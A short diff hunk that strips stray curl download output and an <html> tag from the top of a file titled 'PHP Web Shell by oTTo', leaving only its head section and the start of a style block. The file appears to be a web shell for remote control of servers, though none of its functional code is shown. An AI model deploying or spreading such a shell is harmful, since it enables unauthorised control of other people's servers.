@@ -1,8 +1,4 @@
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-
-  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0<html>
-	<head>
+       <head>
 		<title>PHP Web Shell by oTTo</title>
 		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8";>
 		<style type="text/css">
